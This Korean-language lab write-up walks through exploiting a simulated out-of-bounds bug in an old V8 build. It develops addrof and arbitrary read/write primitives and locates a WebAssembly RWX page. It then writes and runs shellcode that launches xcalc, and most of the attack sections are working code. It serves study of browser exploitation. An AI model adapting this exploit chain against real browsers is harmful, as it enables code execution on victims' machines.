# V8 OOB Exploitation (Chromium < 80.0.3987.87, V8 < 8.0.357)

## Setup

- Ubuntu 20.04.6 LTS (WSL)
- [596cf1ee3e82ce66f6428fb475bb4decd7b9391b](https://chromium.googlesource.com/v8/v8.git/+/596cf1ee3e82ce66f6428fb475bb4decd7b9391b) (2019.11.25.)

[oob.diff](./oob.diff)는 out of bounds 버그가 발생한 상황을 simulate하기 위해 array의 length를 임의로 더 크게 설정해도 array가 확장되지 않도록 하고, [dcheck.diff](./dcheck.diff)는 debug build에서 exploit을 진행할 때 crash가 발생하지 않도록 debug check를 제거한다.

[setup.sh](./setup.sh)

## Exploitation

### Generate OOB array

```js
// flags: --allow-natives-syntax --shell

let oob_arr = [1.1];

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${oob_arr.length}`);

% DebugPrint(oob_arr);
```

![image](https://github.com/user-attachments/assets/e3388db4-0e9d-4a45-bc6f-59031aa2ccc7)

![image](https://github.com/user-attachments/assets/5cb0fff3-d99f-4d23-ae97-b23c0381bbf3)

![image](https://github.com/user-attachments/assets/ed44b19e-37c3-4c57-aa62-571050159792)

`oob_arr`은 한 개의 double을 저장할 수 있는 공간만 가지고 있지만, 버그를 발생시켜 length를 증가시켰기 때문에 자유로운 OOB read/write가 가능하다.

![image](https://github.com/user-attachments/assets/abbfa8be-cc16-4441-abd6-180055d44766)

### Helper functions

```js
let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}
```

### Get address of arbitrary object

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(obj_arr);
```

함수 내부에서 `oob_arr`과 `obj_arr`을 연속해서 정의하면 메모리 상에서 인접한 위치에 할당된다. 따라서 `oob_arr`을 통해 `obj_arr`의 메모리에 접근하여 값을 읽고 쓸 수 있다.

![image](https://github.com/user-attachments/assets/bba863f9-8442-4d71-8165-108c0e5f0e01)

![image](https://github.com/user-attachments/assets/ae00e142-2d7d-4ccf-bb66-47a1a92e38ed)

![image](https://github.com/user-attachments/assets/5edd7a0d-8132-4efd-b3f8-0106bb05e3e3)

OOB를 이용하여 `obj_arr[0]`에 저장된 값을 읽으면 `obj_arr[0]`에 저장된 object의 주소를 double 형태로 얻을 수 있다.

```js
// get address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[7]);
}

// addrof test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] tmp_obj_addr == ${hex(tmp_obj_addr)}`);
```

![image](https://github.com/user-attachments/assets/08b203dc-4958-4b98-be61-2c5535195ed6)

### Arbitrary address read/write

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% Debugprint(typed_arr);
```

![image](https://github.com/user-attachments/assets/5620dffe-4af4-4cb0-9d1a-2c612b4f008b)

![image](https://github.com/user-attachments/assets/1142ceb0-733c-4251-8f8e-e4cbd2b959a8)

`TypedArray`의 `base_pointer`와 `external_pointer`의 합(`data_ptr`)은 첫 번째 element가 저장된 주소가 된다.

![image](https://github.com/user-attachments/assets/7b0c1d6d-9316-43f4-ab50-7c7be8c61c32)

OOB를 이용하여 `base_pointer`를 조작하면 임의의 주소에 접근하여 값을 읽거나 쓸 수 있다.

```js
// arbitrary address read/write
function aarw(addr, value = null) {
    oob_arr[31] = itof(addr - 0xfn); // base_pointer of |typed_arr|
    if (value == null) {
        // if |value| is null, read 8 bytes from |addr|
        return typed_arr[0];
    } else {
        // if |value| isn't null, write |value| to |addr|
        typed_arr[0] = value;
    }
}
```

```js
// aar test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/d86340d3-9015-43e5-84e3-b669f477b50b)

![image](https://github.com/user-attachments/assets/ecf74c13-950c-42e6-84a2-7c1f06648a6f)

```js
// aaw test
aarw(tmp_obj_addr - 1n, 0x4141414141414141n);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/1b197dbd-2c3e-4ad0-9e47-1bae645ce860)

![image](https://github.com/user-attachments/assets/5a1648a1-7dab-4688-8ce9-b942702dac1a)

### Allocate RWX region

`WebAssembly.Instance`를 생성하면 Wasm module의 exported function을 실행하기 위해 RWX permission을 가진 메모리 영역이 할당된다.

```bash
echo "(module (func \$main) (export \"main\" (func \$main)))" > pwn.wat
~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
```

![image](https://github.com/user-attachments/assets/d2d9b093-9a70-47a8-be3d-63cfe1de95df)

```js
// allocate rwx region
let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x04, 0x01, 0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);

% DebugPrint(wasm_instance);
```

![image](https://github.com/user-attachments/assets/5a2aa443-3514-4a78-a87e-828523bd987e)

![image](https://github.com/user-attachments/assets/4055bca6-f3a4-4e8e-ae82-a14d32bd7d86)

![image](https://github.com/user-attachments/assets/bbd63b53-fa0c-45fa-b4e3-7fe4e12d795a)

```js
// get address of rwx region
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let rwx = aarw(wasm_instance_addr - 1n + 0x80n);
console.log(`[+] rwx == ${hex(rwx)}`);
```

![image](https://github.com/user-attachments/assets/e6d46f42-54e5-4044-abb7-8dbf6917915d)

### Execute shellcode

AAW를 이용하여 RWX 영역에 shellcode를 쓰고 Wasm의 exported function을 호출하면 shellcode가 실행된다.

[shellcode.py](./shellcode.py)

```shell
$ python3 shellcode.py
[0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]
```

```js
// execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5];

// write shellcode to rwx region
console.log("[+] Writing shellcode...");
for (let i = 0; i < shellcode.length / 8; i++) {
    let value = 0n;
    for (let j = 0; j < 8; j++) {
        try {
            value += BigInt(shellcode[i * 8 + j]) << BigInt(j * 8);
        } catch (e) { }
    }
    aarw(rwx + BigInt(i * 8), value);
}
```

![image](https://github.com/user-attachments/assets/9fb76a98-274f-400b-8b8c-d1556e53c90c)

![image](https://github.com/user-attachments/assets/ffb1cad8-f4c7-49ea-9246-857995e11515)

```js
// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
```

[pwn.js](./pwn.js)

![image](https://github.com/user-attachments/assets/7f59a803-f3a5-4a88-86df-780d481c6bc0)

## Patch

> [[ptr-compr][x64] Enable pointer compression on x64](https://chromium.googlesource.com/v8/v8.git/+/f046b936f889d1084eb1d743044d94799713904d) (2019.11.25.)

```diff
diff --git a/BUILD.gn b/BUILD.gn
index 6ba2464..55db34b 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -230,8 +230,9 @@
   v8_enable_snapshot_native_code_counters = v8_enable_debugging_features
 }
 if (v8_enable_pointer_compression == "") {
-  # TODO(v8:v7703): temporarily enable pointer compression on arm64
-  v8_enable_pointer_compression = v8_current_cpu == "arm64"
+  # TODO(v8:v7703): temporarily enable pointer compression on arm64 and on x64
+  v8_enable_pointer_compression =
+      v8_current_cpu == "arm64" || v8_current_cpu == "x64"
 }
 if (v8_enable_fast_torque == "") {
   v8_enable_fast_torque = v8_enable_fast_mksnapshot
```

Pointer compression이 적용되어, 이제 V8이 생성하는 모든 object들은 4바이트 범위의 virtual memory cage 내부에 할당되고, object의 주소가 메모리에 저장될 때는 (대부분의 경우) cage의 base address를 제외한 4바이트만 저장된다.
